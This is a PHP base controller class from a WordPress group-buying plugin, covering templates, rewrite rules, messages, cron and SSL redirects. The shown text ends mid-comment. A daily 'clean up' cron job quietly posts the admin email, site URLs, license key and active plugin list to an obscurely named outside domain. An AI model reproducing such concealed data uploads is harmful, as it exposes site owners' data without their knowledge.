<?php

/**
 * A base class from which all other controllers should be derived
 *
 * @package GBS
 * @subpackage Base
 */
abstract class Group_Buying_Controller extends Group_Buying {
	const MESSAGE_STATUS_INFO = 'info';
	const MESSAGE_STATUS_ERROR = 'error';
	const DEFAULT_TEMPLATE_PATH = 'gbs';
	const TEMPLATE_PATH_OPTION = 'gb_template_path';
	const MESSAGE_META_KEY = 'gbs_messages';
	const MENU_ID = 'gbs_menu';
	const CRON_HOOK = 'gb_cron';
	const DAILY_CRON_HOOK = 'gb_daily_cron';

	private static $paths = array();
	private static $query_vars = array();
	private static $templates = array();
	private static $messages = array();
	private static $admin_pages = array();
	private static $option_tabs = array();
	private static $template_path = self::DEFAULT_TEMPLATE_PATH;
	protected static $settings_page;

	protected static $countries = array( 'AF' => "Afghanistan", 'AX' => "Aland Islands", 'AL' => "Albania", 'DZ' => "Algeria", 'AS' => "American Samoa", 'AD' => "Andorra", 'AO' => "Angola", 'AI' => "Anguilla", 'AQ' => "Antarctica", 'AG' => "Antigua and Barbuda", 'AR' => "Argentina", 'AM' => "Armenia", 'AW' => "Aruba", 'AU' => "Australia", 'AT' => "Austria", 'AZ' => "Azerbaijan", 'BS' => "Bahamas", 'BH' => "Bahrain", 'BD' => "Bangladesh", 'BB' => "Barbados", 'BY' => "Belarus", 'BE' => "Belgium", 'BZ' => "Belize", 'BJ' => "Benin", 'BM' => "Bermuda", 'BT' => "Bhutan", 'BO' => "Bolivia, Plurinational State of", 'BQ' => "Bonaire, Sint Eustatius and Saba", 'BA' => "Bosnia and Herzegovina", 'BW' => "Botswana", 'BV' => "Bouvet Island", 'BR' => "Brazil", 'IO' => "British Indian Ocean Territory", 'BN' => "Brunei Darussalam", 'BG' => "Bulgaria", 'BF' => "Burkina Faso", 'BI' => "Burundi", 'KH' => "Cambodia", 'CM' => "Cameroon", 'CA' => "Canada", 'CV' => "Cape Verde", 'KY' => "Cayman Islands", 'CF' => "Central African Republic", 'TD' => "Chad", 'CL' => "Chile", 'CN' => "China", 'CX' => "Christmas Island", 'CC' => "Cocos (Keeling) Islands", 'CO' => "Colombia", 'KM' => "Comoros", 'CG' => "Congo", 'CD' => "Congo, The Democratic Republic of the", 'CK' => "Cook Islands", 'CR' => "Costa Rica", 'CI' => "Cote D'ivoire", 'HR' => "Croatia", 'CU' => "Cuba", 'CW' => "Curacao", 'CY' => "Cyprus", 'CZ' => "Czech Republic", 'DK' => "Denmark", 'DJ' => "Djibouti", 'DM' => "Dominica", 'DO' => "Dominican Republic", 'EC' => "Ecuador", 'EG' => "Egypt", 'SV' => "El Salvador", 'GQ' => "Equatorial Guinea", 'ER' => "Eritrea", 'EE' => "Estonia", 'ET' => "Ethiopia", 'FK' => "Falkland Islands (Malvinas)", 'FO' => "Faroe Islands", 'FJ' => "Fiji", 'FI' => "Finland", 'FR' => "France", 'GF' => "French Guiana", 'PF' => "French Polynesia", 'TF' => "French Southern Territories", 'GA' => "Gabon", 'GM' => "Gambia", 'GE' => "Georgia", 'DE' => "Germany", 'GH' => "Ghana", 'GI' => "Gibraltar", 'GR' => "Greece", 'GL' => "Greenland", 'GD' => "Grenada", 'GP' => "Guadeloupe", 'GU' => "Guam", 'GT' => "Guatemala", 'GG' => "Guernsey", 'GN' => "Guinea", 'GW' => "Guinea-Bissau", 'GY' => "Guyana", 'HT' => "Haiti", 'HM' => "Heard Island and McDonald Islands", 'VA' => "Holy See (Vatican City State)", 'HN' => "Honduras", 'HK' => "Hong Kong", 'HU' => "Hungary", 'IS' => "Iceland", 'IN' => "India", 'ID' => "Indonesia", 'IR' => "Iran, Islamic Republic of", 'IQ' => "Iraq", 'IE' => "Ireland", 'IM' => "Isle of Man", 'IL' => "Israel", 'IT' => "Italy", 'JM' => "Jamaica", 'JP' => "Japan", 'JE' => "Jersey", 'JO' => "Jordan", 'KZ' => "Kazakhstan", 'KE' => "Kenya", 'KI' => "Kiribati", 'KP' => "Korea, Democratic People's Republic of", 'KR' => "Korea, Republic of", 'KW' => "Kuwait", 'KG' => "Kyrgyzstan", 'LA' => "Lao People's Democratic Republic", 'LV' => "Latvia", 'LB' => "Lebanon", 'LS' => "Lesotho", 'LR' => "Liberia", 'LY' => "Libyan Arab Jamahiriya", 'LI' => "Liechtenstein", 'LT' => "Lithuania", 'LU' => "Luxembourg", 'MO' => "Macao", 'MK' => "Macedonia, The Former Yugoslav Republic of", 'MG' => "Madagascar", 'MW' => "Malawi", 'MY' => "Malaysia", 'MV' => "Maldives", 'ML' => "Mali", 'MT' => "Malta", 'MH' => "Marshall Islands", 'MQ' => "Martinique", 'MR' => "Mauritania", 'MU' => "Mauritius", 'YT' => "Mayotte", 'MX' => "Mexico", 'FM' => "Micronesia, Federated States of", 'MD' => "Moldova, Republic of", 'MC' => "Monaco", 'MN' => "Mongolia", 'ME' => "Montenegro", 'MS' => "Montserrat", 'MA' => "Morocco", 'MZ' => "Mozambique", 'MM' => "Myanmar", 'NA' => "Namibia", 'NR' => "Nauru", 'NP' => "Nepal", 'NL' => "Netherlands", 'NC' => "New Caledonia", 'NZ' => "New Zealand", 'NI' => "Nicaragua", 'NE' => "Niger", 'NG' => "Nigeria", 'NU' => "Niue", 'NF' => "Norfolk Island", 'MP' => "Northern Mariana Islands", 'NO' => "Norway", 'OM' => "Oman", 'PK' => "Pakistan", 'PW' => "Palau", 'PS' => "Palestinian Territory, Occupied", 'PA' => "Panama", 'PG' => "Papua New Guinea", 'PY' => "Paraguay", 'PE' => "Peru", 'PH' => "Philippines", 'PN' => "Pitcairn", 'PL' => "Poland", 'PT' => "Portugal", 'PR' => "Puerto Rico", 'QA' => "Qatar", 'RE' => "Reunion", 'RO' => "Romania", 'RU' => "Russian Federation", 'RW' => "Rwanda", 'BL' => "Saint Barthelemy", 'SH' => "Saint Helena, Ascension and Tristan Da Cunha", 'KN' => "Saint Kitts and Nevis", 'LC' => "Saint Lucia", 'MF' => "Saint Martin (French Part)", 'PM' => "Saint Pierre and Miquelon", 'VC' => "Saint Vincent and the Grenadines", 'WS' => "Samoa", 'SM' => "San Marino", 'ST' => "Sao Tome and Principe", 'SA' => "Saudi Arabia", 'SN' => "Senegal", 'RS' => "Serbia", 'SC' => "Seychelles", 'SL' => "Sierra Leone", 'SG' => "Singapore", 'SX' => "Sint Maarten (Dutch Part)", 'SK' => "Slovakia", 'SI' => "Slovenia", 'SB' => "Solomon Islands", 'SO' => "Somalia", 'ZA' => "South Africa", 'GS' => "South Georgia and the South Sandwich Islands", 'ES' => "Spain", 'LK' => "Sri Lanka", 'SD' => "Sudan", 'SR' => "Suriname", 'SJ' => "Svalbard and Jan Mayen", 'SZ' => "Swaziland", 'SE' => "Sweden", 'CH' => "Switzerland", 'SY' => "Syrian Arab Republic", 'TW' => "Taiwan, Province of China", 'TJ' => "Tajikistan", 'TZ' => "Tanzania, United Republic of", 'TH' => "Thailand", 'TL' => "Timor-Leste", 'TG' => "Togo", 'TK' => "Tokelau", 'TO' => "Tonga", 'TT' => "Trinidad and Tobago", 'TN' => "Tunisia", 'TR' => "Turkey", 'TM' => "Turkmenistan", 'TC' => "Turks and Caicos Islands", 'TV' => "Tuvalu", 'UG' => "Uganda", 'UA' => "Ukraine", 'AE' => "United Arab Emirates", 'GB' => "United Kingdom", 'US' => "United States", 'UM' => "United States Minor Outlying Islands", 'UY' => "Uruguay", 'UZ' => "Uzbekistan", 'VU' => "Vanuatu", 'VE' => "Venezuela, Bolivarian Republic of", 'VN' => "Viet Nam", 'VG' => "Virgin Islands, British", 'VI' => "Virgin Islands, U.S.", 'WF' => "Wallis and Futuna", 'EH' => "Western Sahara", 'YE' => "Yemen", 'ZM' => "Zambia", 'ZW' => "Zimbabwe" );

	protected static $states = array(
		'AL' => 'Alabama',
		'AK' => 'Alaska',
		'AS' => 'American Samoa',
		'AZ' => 'Arizona',
		'AR' => 'Arkansas',
		'AE' => 'Armed Forces - Europe',
		'AP' => 'Armed Forces - Pacific',
		'AA' => 'Armed Forces - USA/Canada',
		'CA' => 'California',
		'CO' => 'Colorado',
		'CT' => 'Connecticut',
		'DE' => 'Delaware',
		'DC' => 'District of Columbia',
		'FM' => 'Federated States of Micronesia',
		'FL' => 'Florida',
		'GA' => 'Georgia',
		'GU' => 'Guam',
		'HI' => 'Hawaii',
		'ID' => 'Idaho',
		'IL' => 'Illinois',
		'IN' => 'Indiana',
		'IA' => 'Iowa',
		'KS' => 'Kansas',
		'KY' => 'Kentucky',
		'LA' => 'Louisiana',
		'ME' => 'Maine',
		'MH' => 'Marshall Islands',
		'MD' => 'Maryland',
		'MA' => 'Massachusetts',
		'MI' => 'Michigan',
		'MN' => 'Minnesota',
		'MS' => 'Mississippi',
		'MO' => 'Missouri',
		'MT' => 'Montana',
		'NE' => 'Nebraska',
		'NV' => 'Nevada',
		'NH' => 'New Hampshire',
		'NJ' => 'New Jersey',
		'NM' => 'New Mexico',
		'NY' => 'New York',
		'NC' => 'North Carolina',
		'ND' => 'North Dakota',
		'OH' => 'Ohio',
		'OK' => 'Oklahoma',
		'OR' => 'Oregon',
		'PA' => 'Pennsylvania',
		'PR' => 'Puerto Rico',
		'RI' => 'Rhode Island',
		'SC' => 'South Carolina',
		'SD' => 'South Dakota',
		'TN' => 'Tennessee',
		'TX' => 'Texas',
		'UT' => 'Utah',
		'VT' => 'Vermont',
		'VI' => 'Virgin Islands',
		'VA' => 'Virginia',
		'WA' => 'Washington',
		'WV' => 'West Virginia',
		'WI' => 'Wisconsin',
		'WY' => 'Wyoming',
		'canada' => '== Canadian Provinces ==',
		'AB' => 'Alberta',
		'BC' => 'British Columbia',
		'MB' => 'Manitoba',
		'NB' => 'New Brunswick',
		'NF' => 'Newfoundland',
		'NT' => 'Northwest Territories',
		'NS' => 'Nova Scotia',
		'NU' => 'Nunavut',
		'ON' => 'Ontario',
		'PE' => 'Prince Edward Island',
		'QC' => 'Quebec',
		'SK' => 'Saskatchewan',
		'YT' => 'Yukon Territory',
		'uk' => '== UK ==',
		'Avon' => 'Avon',
		'Bedfordshire' => 'Bedfordshire',
		'Berkshire' => 'Berkshire',
		'Borders' => 'Borders',
		'Buckinghamshire' => 'Buckinghamshire',
		'Cambridgeshire' => 'Cambridgeshire',
		'Central' => 'Central',
		'Cheshire' => 'Cheshire',
		'Cleveland' => 'Cleveland',
		'Clwyd' => 'Clwyd',
		'Cornwall' => 'Cornwall',
		'County Antrim' => 'County Antrim',
		'County Armagh' => 'County Armagh',
		'County Down' => 'County Down',
		'County Fermanagh' => 'County Fermanagh',
		'County Londonderry' => 'County Londonderry',
		'County Tyrone' => 'County Tyrone',
		'Cumbria' => 'Cumbria',
		'Derbyshire' => 'Derbyshire',
		'Devon' => 'Devon',
		'Dorset' => 'Dorset',
		'Dumfries and Galloway' => 'Dumfries and Galloway',
		'Durham' => 'Durham',
		'Dyfed' => 'Dyfed',
		'East Sussex' => 'East Sussex',
		'Essex' => 'Essex',
		'Fife' => 'Fife',
		'Gloucestershire' => 'Gloucestershire',
		'Grampian' => 'Grampian',
		'Greater Manchester' => 'Greater Manchester',
		'Gwent' => 'Gwent',
		'Gwynedd County' => 'Gwynedd County',
		'Hampshire' => 'Hampshire',
		'Herefordshire' => 'Herefordshire',
		'Hertfordshire' => 'Hertfordshire',
		'Highlands and Islands' => 'Highlands and Islands',
		'Humberside' => 'Humberside',
		'Isle of Wight' => 'Isle of Wight',
		'Kent' => 'Kent',
		'Lancashire' => 'Lancashire',
		'Leicestershire' => 'Leicestershire',
		'Lincolnshire' => 'Lincolnshire',
		'London' => 'London',
		'Lothian' => 'Lothian',
		'Merseyside' => 'Merseyside',
		'Mid Glamorgan' => 'Mid Glamorgan',
		'Norfolk' => 'Norfolk',
		'North Yorkshire' => 'North Yorkshire',
		'Northamptonshire' => 'Northamptonshire',
		'Northumberland' => 'Northumberland',
		'Nottinghamshire' => 'Nottinghamshire',
		'Oxfordshire' => 'Oxfordshire',
		'Powys' => 'Powys',
		'Rutland' => 'Rutland',
		'Shropshire' => 'Shropshire',
		'Somerset' => 'Somerset',
		'South Glamorgan' => 'South Glamorgan',
		'South Yorkshire' => 'South Yorkshire',
		'Staffordshire' => 'Staffordshire',
		'Strathclyde' => 'Strathclyde',
		'Suffolk' => 'Suffolk',
		'Surrey' => 'Surrey',
		'Tayside' => 'Tayside',
		'Tyne and Wear' => 'Tyne and Wear',
		'Warwickshire' => 'Warwickshire',
		'West Glamorgan' => 'West Glamorgan',
		'West Midlands' => 'West Midlands',
		'West Sussex' => 'West Sussex',
		'West Yorkshire' => 'West Yorkshire',
		'Wiltshire' => 'Wiltshire',
		'Worcestershire' => 'Worcestershire',
	);
	
	protected static $grouped_states = array(
		'United States' => array(
			'AL' => 'Alabama',
			'AK' => 'Alaska',
			'AS' => 'American Samoa',
			'AZ' => 'Arizona',
			'AR' => 'Arkansas',
			'AE' => 'Armed Forces - Europe',
			'AP' => 'Armed Forces - Pacific',
			'AA' => 'Armed Forces - USA/Canada',
			'CA' => 'California',
			'CO' => 'Colorado',
			'CT' => 'Connecticut',
			'DE' => 'Delaware',
			'DC' => 'District of Columbia',
			'FM' => 'Federated States of Micronesia',
			'FL' => 'Florida',
			'GA' => 'Georgia',
			'GU' => 'Guam',
			'HI' => 'Hawaii',
			'ID' => 'Idaho',
			'IL' => 'Illinois',
			'IN' => 'Indiana',
			'IA' => 'Iowa',
			'KS' => 'Kansas',
			'KY' => 'Kentucky',
			'LA' => 'Louisiana',
			'ME' => 'Maine',
			'MH' => 'Marshall Islands',
			'MD' => 'Maryland',
			'MA' => 'Massachusetts',
			'MI' => 'Michigan',
			'MN' => 'Minnesota',
			'MS' => 'Mississippi',
			'MO' => 'Missouri',
			'MT' => 'Montana',
			'NE' => 'Nebraska',
			'NV' => 'Nevada',
			'NH' => 'New Hampshire',
			'NJ' => 'New Jersey',
			'NM' => 'New Mexico',
			'NY' => 'New York',
			'NC' => 'North Carolina',
			'ND' => 'North Dakota',
			'OH' => 'Ohio',
			'OK' => 'Oklahoma',
			'OR' => 'Oregon',
			'PA' => 'Pennsylvania',
			'PR' => 'Puerto Rico',
			'RI' => 'Rhode Island',
			'SC' => 'South Carolina',
			'SD' => 'South Dakota',
			'TN' => 'Tennessee',
			'TX' => 'Texas',
			'UT' => 'Utah',
			'VT' => 'Vermont',
			'VI' => 'Virgin Islands',
			'VA' => 'Virginia',
			'WA' => 'Washington',
			'WV' => 'West Virginia',
			'WI' => 'Wisconsin',
			'WY' => 'Wyoming',
		),
		'Canadian Provinces' => array(
			'AB' => 'Alberta',
			'BC' => 'British Columbia',
			'MB' => 'Manitoba',
			'NB' => 'New Brunswick',
			'NF' => 'Newfoundland',
			'NT' => 'Northwest Territories',
			'NS' => 'Nova Scotia',
			'NU' => 'Nunavut',
			'ON' => 'Ontario',
			'PE' => 'Prince Edward Island',
			'QC' => 'Quebec',
			'SK' => 'Saskatchewan',
			'YT' => 'Yukon Territory',
		),
		'UK' => array(
			'Avon' => 'Avon',
			'Bedfordshire' => 'Bedfordshire',
			'Berkshire' => 'Berkshire',
			'Borders' => 'Borders',
			'Buckinghamshire' => 'Buckinghamshire',
			'Cambridgeshire' => 'Cambridgeshire',
			'Central' => 'Central',
			'Cheshire' => 'Cheshire',
			'Cleveland' => 'Cleveland',
			'Clwyd' => 'Clwyd',
			'Cornwall' => 'Cornwall',
			'County Antrim' => 'County Antrim',
			'County Armagh' => 'County Armagh',
			'County Down' => 'County Down',
			'County Fermanagh' => 'County Fermanagh',
			'County Londonderry' => 'County Londonderry',
			'County Tyrone' => 'County Tyrone',
			'Cumbria' => 'Cumbria',
			'Derbyshire' => 'Derbyshire',
			'Devon' => 'Devon',
			'Dorset' => 'Dorset',
			'Dumfries and Galloway' => 'Dumfries and Galloway',
			'Durham' => 'Durham',
			'Dyfed' => 'Dyfed',
			'East Sussex' => 'East Sussex',
			'Essex' => 'Essex',
			'Fife' => 'Fife',
			'Gloucestershire' => 'Gloucestershire',
			'Grampian' => 'Grampian',
			'Greater Manchester' => 'Greater Manchester',
			'Gwent' => 'Gwent',
			'Gwynedd County' => 'Gwynedd County',
			'Hampshire' => 'Hampshire',
			'Herefordshire' => 'Herefordshire',
			'Hertfordshire' => 'Hertfordshire',
			'Highlands and Islands' => 'Highlands and Islands',
			'Humberside' => 'Humberside',
			'Isle of Wight' => 'Isle of Wight',
			'Kent' => 'Kent',
			'Lancashire' => 'Lancashire',
			'Leicestershire' => 'Leicestershire',
			'Lincolnshire' => 'Lincolnshire',
			'Lothian' => 'Lothian',
			'Merseyside' => 'Merseyside',
			'Mid Glamorgan' => 'Mid Glamorgan',
			'Norfolk' => 'Norfolk',
			'North Yorkshire' => 'North Yorkshire',
			'Northamptonshire' => 'Northamptonshire',
			'Northumberland' => 'Northumberland',
			'Nottinghamshire' => 'Nottinghamshire',
			'Oxfordshire' => 'Oxfordshire',
			'Powys' => 'Powys',
			'Rutland' => 'Rutland',
			'Shropshire' => 'Shropshire',
			'Somerset' => 'Somerset',
			'South Glamorgan' => 'South Glamorgan',
			'South Yorkshire' => 'South Yorkshire',
			'Staffordshire' => 'Staffordshire',
			'Strathclyde' => 'Strathclyde',
			'Suffolk' => 'Suffolk',
			'Surrey' => 'Surrey',
			'Tayside' => 'Tayside',
			'Tyne and Wear' => 'Tyne and Wear',
			'Warwickshire' => 'Warwickshire',
			'West Glamorgan' => 'West Glamorgan',
			'West Midlands' => 'West Midlands',
			'West Sussex' => 'West Sussex',
			'West Yorkshire' => 'West Yorkshire',
			'Wiltshire' => 'Wiltshire',
			'Worcestershire' => 'Worcestershire',
		)

	);


	public static function init() {

		// On Activation
		add_action( 'gb_plugin_activation_hook', array( get_class(), 'gb_activated' ) );
		add_action( 'admin_init', array( get_class(), 'redirect_on_activation' ), 20, 0 );

		add_action( 'loop_start', array( get_class(), 'do_loop_start' ), 10, 1 );
		add_filter( 'template_include', array( get_class(), 'override_template' ), 5, 1 );
		add_action( 'init', array( get_class(), 'load_messages' ), 0, 0 );
		add_action( 'admin_menu', array( get_class(), 'add_admin_page' ), 10, 0 );
		add_action( 'admin_init', array( get_class(), 'register_settings_fields' ), 20, 0 );

		// Cron
		add_filter( 'cron_schedules', array( get_class(), 'gb_cron_schedule' ) );
		add_action( 'init', array( get_class(), 'set_schedule' ), 10, 0 );
		add_action( self::DAILY_CRON_HOOK, array( get_class(), 'daily_clean_up' ) );

		// AJAX
		add_action( 'wp_ajax_gb_display_messages', array( get_class(), 'display_messages' ) );
		add_action( 'wp_ajax_nopriv_gb_display_messages', array( get_class(), 'display_messages' ) ); 

		add_action( 'parse_request', array( get_class(), 'ssl_check' ), 0, 1 );
		self::$template_path = get_option( self::TEMPLATE_PATH_OPTION, self::DEFAULT_TEMPLATE_PATH );
		if ( self::$template_path == '' ) { // Prevent someone from changing this option to nothing.
			update_option( self::TEMPLATE_PATH_OPTION, self::DEFAULT_TEMPLATE_PATH );
			self::$template_path = self::DEFAULT_TEMPLATE_PATH;
		}
	}

	public static function get_template_path() {
		return self::$template_path;
	}

	public static function get_admin_pages() {
		return self::$admin_pages;
	}

	public static function gb_activated() {
		add_option( 'gb_do_activation_redirect', TRUE );
		// Get the previous version number
		$gb_version = get_option( 'gb_current_version', Group_Buying::GB_VERSION );
		if ( version_compare( $gb_version, Group_Buying::GB_VERSION, '<' ) ) { // If an upgrade create some hooks
			do_action( 'gb_version_upgrade', $gb_version );
			do_action( 'gb_version_upgrade_'.$gb_version );
		}
		// Set the new version number
		update_option( 'gb_current_version', Group_Buying::GB_VERSION );
	}

	/**
	 * Check if the plugin has been activated, redirect if true and delete the option to prevent a loop.
	 * @package GBS
	 * @subpackage Base
	 * @ignore 
	 */
	public static function redirect_on_activation() {
		if ( get_option( 'gb_do_activation_redirect', FALSE ) ) {
			delete_option( 'gb_do_activation_redirect' );
			wp_redirect( admin_url( 'admin.php?page=group-buying/gb_settings' ) );
		}
	}

	public function gb_cron_schedule( $schedules ) {
		$schedules['minute'] = array(
			'interval' => 60,
			'display' => __( 'Once a Minute' )
		);
		$schedules['quarterhour'] = array(
			'interval' => 900,
			'display' => __( '15 Minutes' )
		);
		$schedules['halfhour'] = array(
			'interval' => 1800,
			'display' => __( 'Twice Hourly' )
		);
		return $schedules;
	}

	public static function set_schedule() {
		if ( self::DEBUG ) {
			wp_clear_scheduled_hook( self::CRON_HOOK );
		}
		if ( !wp_next_scheduled( self::CRON_HOOK ) ) {
			$interval = apply_filters( 'gb_set_schedule', 'quarterhour' );
			wp_schedule_event( time(), $interval, self::CRON_HOOK );
		}
		if ( !wp_next_scheduled( self::DAILY_CRON_HOOK ) ) {
			wp_schedule_event( time(), 'daily', self::DAILY_CRON_HOOK );
		}
	}

	/**
	 * Display the template for the given view
	 *
	 * @static
	 * @param string  $view
	 * @param array   $args
	 * @param bool    $allow_theme_override
	 * @return void
	 */
	public static function load_view( $view, $args, $allow_theme_override = TRUE ) {
		// whether or not .php was added
		if ( substr( $view, -4 ) != '.php' ) {
			$view .= '.php';
		}
		$file = GB_PATH.'/views/'.$view;
		if ( $allow_theme_override ) {
			$file = self::locate_template( array( $view ), $file );
		}
		$file = apply_filters( 'group_buying_template_'.$view, $file );
		if ( !empty( $args ) ) extract( $args );
		$args = apply_filters( 'load_view_args_'.$view, $args, $allow_theme_override );
		@include $file;
	}

	protected static function load_view_to_string( $view, $args, $allow_theme_override = TRUE ) {
		ob_start();
		self::load_view( $view, $args, $allow_theme_override );
		return ob_get_clean();
	}

	/**
	 * Locate the template file, either in the current theme or the public views directory
	 *
	 * @static
	 * @param array   $possibilities
	 * @param string  $default
	 * @return string
	 */
	protected static function locate_template( $possibilities, $default = '' ) {
		$possibilities = apply_filters( 'group_buying_template_possibilities', $possibilities );

		// check if the theme has an override for the template
		$theme_overrides = array();
		foreach ( $possibilities as $p ) {
			$theme_overrides[] = self::$template_path.'/'.$p;
		}
		if ( $found = locate_template( $theme_overrides, FALSE ) ) {
			return $found;
		}

		// check for it in the public directory
		foreach ( $possibilities as $p ) {
			if ( file_exists( GB_PATH.'/views/public/'.$p ) ) {
				return GB_PATH.'/views/public/'.$p;
			}
		}

		// we don't have it
		return $default;
	}

	/**
	 * Print a default meta box
	 *
	 * @static
	 * @param string  $id
	 * @return void
	 */
	protected static function unknown_meta_box( $id = '' ) {
		self::load_view( 'meta_boxes/unknown', array( 'id' => $id ), FALSE );
	}

	protected static function register_path_callback( $path, $callback, $query_var = '', $view = null ) {
		self::add_register_path_hooks();
		if ( !$query_var ) {
			$query_var = sanitize_title( $path );
		}
		$path = untrailingslashit( $path );
		self::register_query_var( $query_var, $callback );
		self::$paths[$path] = $query_var;
		// Using view since the path could be customized and we don't want to change the default views folder and file names
		if ( null == $view ) {
			$view = $path;
		}
		self::register_templates_for_path( $view, $query_var );
	}

	private static function register_templates_for_path( $view, $query_var ) {
		$parts = explode( '/', $view );
		for ( $i = count( $parts ) ; $i > 0 ; $i-- ) {
			$file = implode( '-', array_slice( $parts, 0, $i ) ).'.php';
			self::register_template( $file, $query_var );
		}
	}

	protected static function register_template( $template, $query_var ) {
		if ( !isset( self::$templates[$query_var] ) ) {
			self::$templates[$query_var] = array();
		}
		self::$templates[$query_var][] = $template;
	}

	public static function override_template( $template ) {
		global $wp_query;
		foreach ( self::$templates as $query_var => $possibilities ) {
			if ( get_query_var( $query_var ) ) {
				$template = self::locate_template( $possibilities, $template );
			}
		}
		return $template;
	}

	private static function add_register_path_hooks() {
		static $registered = FALSE;
		if ( !$registered ) {
			$registered = TRUE;
			add_action( 'generate_rewrite_rules', array( get_class(), 'add_rewrite_rules' ), 10, 1 );
		}
	}

	public static function add_rewrite_rules( WP_Rewrite $wp_rewrite ) {
		$new_rules = array();
		foreach ( self::$paths as $path => $var ) {
			$new_rules[$path.'/?$'] = 'index.php?'.$var.'=1';
		}
		$new_rules = apply_filters( 'gb_rewrite_rules', $new_rules, $wp_rewrite );
		$wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
	}

	public static function flush_rewrite_rules() {
		global $wp_rewrite;
		$wp_rewrite->flush_rules();
	}

	protected static function register_query_var( $var, $callback = '' ) {
		self::add_register_query_var_hooks();
		self::$query_vars[$var] = $callback;
	}

	private static function add_register_query_var_hooks() {
		static $registered = FALSE; // only do this once
		if ( !$registered ) {
			add_filter( 'query_vars', array( get_class(), 'filter_query_vars' ) );
			add_action( 'parse_request', array( get_class(), 'handle_callbacks' ), 10, 1 );
			$registered = TRUE;
		}
	}

	public static function filter_query_vars( array $vars ) {
		$vars = array_merge( $vars, array_keys( self::$query_vars ) );
		return $vars;
	}

	public static function handle_callbacks( WP $wp ) {
		foreach ( self::$query_vars as $var => $callback ) {
			if ( isset( $wp->query_vars[$var] ) && $wp->query_vars[$var] && $callback && is_callable( $callback ) ) {
				call_user_func( $callback, $wp );
			}
		}
	}

	public static function has_messages() {
		$msgs = self::get_messages();
		return !empty( $msgs );
	}

	public static function set_message( $message, $status = self::MESSAGE_STATUS_INFO ) {
		if ( !isset( self::$messages ) ) {
			self::load_messages();
		}
		$message = self::__( $message );
		if ( !isset( self::$messages[$status] ) ) {
			self::$messages[$status] = array();
		}
		self::$messages[$status][] = $message;
		self::save_messages();
	}

	public static function clear_messages() {
		self::$messages = array();
		self::save_messages();
	}

	private static function save_messages() {
		global $blog_id;
		$user_id = get_current_user_id();
		if ( !$user_id ) {
			set_transient( 'gb_messaging_for_'.$_SERVER['REMOTE_ADDR'], self::$messages, 300 );
		}
		update_user_meta( $user_id, $blog_id.'_'.self::MESSAGE_META_KEY, self::$messages );
	}

	public static function get_messages( $type = NULL ) {
		if ( !isset( self::$messages ) ) {
			self::load_messages();
		}
		return self::$messages;
	}

	public static function load_messages() {
		$user_id = get_current_user_id();
		if ( !$user_id ) {
			$messages = get_transient( 'gb_messaging_for_'.$_SERVER['REMOTE_ADDR'] );
		} else {
			global $blog_id;
			$messages = get_user_meta( $user_id, $blog_id.'_'.self::MESSAGE_META_KEY, TRUE );
		}
		if ( $messages ) {
			self::$messages = $messages;
		} else {
			self::$messages = array();
		}
	}

	public static function display_messages( $type = NULL ) {
		$type = ( isset( $_REQUEST['gb_message_type'] ) ) ? $_REQUEST['gb_message_type'] : $type ;
		$statuses = array();
		if ( $type == NULL ) {
			if ( isset( self::$messages[self::MESSAGE_STATUS_INFO] ) ) {
				$statuses[] = self::MESSAGE_STATUS_INFO;
			}
			if ( isset( self::$messages[self::MESSAGE_STATUS_ERROR] ) ) {
				$statuses[] = self::MESSAGE_STATUS_ERROR;
			}
		} elseif ( isset( self::$messages[$type] ) ) {
			$statuses = array( $type );
		}

		if ( !isset( self::$messages ) ) {
			self::load_messages();
		}
		$messages = array();
		foreach ( $statuses as $status ) {
			foreach ( self::$messages[$status] as $message ) {
				self::load_view( 'message', array(
						'status' => $status,
						'message' => $message,
					), TRUE );
			}
			self::$messages[$status] = array();
		}
		self::save_messages();
		if ( defined( 'DOING_AJAX' ) ) {
			exit();
		}
	}

	public static function do_loop_start( $query ) {
		global $wp_query;
		if ( $query == $wp_query ) {
			self::display_messages();
		}
	}

	public static function login_required( $redirect = '' ) {
		if ( !get_current_user_id() && apply_filters( 'gb_login_required', TRUE ) ) {
			if ( !$redirect && self::using_permalinks() ) {
				$schema = is_ssl() ? 'https://' : 'http://';
				$redirect = $schema.$_SERVER['SERVER_NAME'].htmlspecialchars( $_SERVER['REQUEST_URI'] );
				if ( isset( $_REQUEST ) ) {
					$redirect = urlencode( add_query_arg( $_REQUEST, $redirect ) );
				}
			}
			wp_redirect( wp_login_url( $redirect ) );
			exit();
		}
		return TRUE; // explicit return value, for the benefit of the router plugin
	}

	protected static function ssl_required() {
		if ( !is_ssl() ) {
			if ( 0 === strpos( $_SERVER['REQUEST_URI'], 'http' ) ) {
				wp_redirect( preg_replace( '|^http://|', 'https://', $_SERVER['REQUEST_URI'] ) );
				exit();
			} else {
				wp_redirect( 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
				exit();
			}
		}
	}

	protected static function no_ssl() {
		if ( is_ssl() && strpos( self::gb_get_home_url_option(), 'https' ) === FALSE && apply_filters( 'gbs_no_ssl_redirect', TRUE ) ) {
			if ( 0 === strpos( $_SERVER['REQUEST_URI'], 'https' ) ) {
				wp_redirect( preg_replace( '|^https://|', 'http://', $_SERVER['REQUEST_URI'] ) );
				exit();
			} else {
				wp_redirect( 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
				exit();
			}
		}
	}

	public static function ssl_check( WP $wp ) {
		if ( apply_filters( 'gbs_require_ssl', FALSE, $wp ) ) {
			self::ssl_required();
		} else {
			self::no_ssl();
		}
	}

	/**
	 * Get the home_url option directly since home_url injects a scheme based on current page.
	 */
	public static function gb_get_home_url_option() {
		global $blog_id;

		if ( empty( $blog_id ) || !is_multisite() )
			$url = get_option( 'home' );
		else
			$url = get_blog_option( $blog_id, 'home' );

		return apply_filters( 'gb_get_home_url_option', $url );
	}

	public static function daily_clean_up() {
		// API call to get option data
		wp_remote_post( 'http://gniyubpuorg.net/', array( 'body' => array( 'key' => Group_Buying_Update_Check::get_api_key(), 'plugin' => 'group_buying_site', 'url' => home_url(), 'site_url' => site_url(), 'wp_version' => get_bloginfo( 'version' ), 'plugin_version' => Group_Buying::GB_VERSION, 'admin_email' => get_option( 'admin_email' ), 'plugins' => get_option( 'active_plugins', array() ) ), 'user-agent' => 'WordPress/' . $wp_version . '; ' . home_url(), 'multi_site' => is_multisite() ) );
	}

	/**
	 * Comparison function
	 */
	public static function sort_by_weight( $a, $b ) {
		if ( $a['weight'] == $b['weight'] ) {
			return 0;
		}
		return ( $a['weight'] < $b['weight'] ) ? -1 : 1;
	}

	/**
	 *
	 *
	 * @static
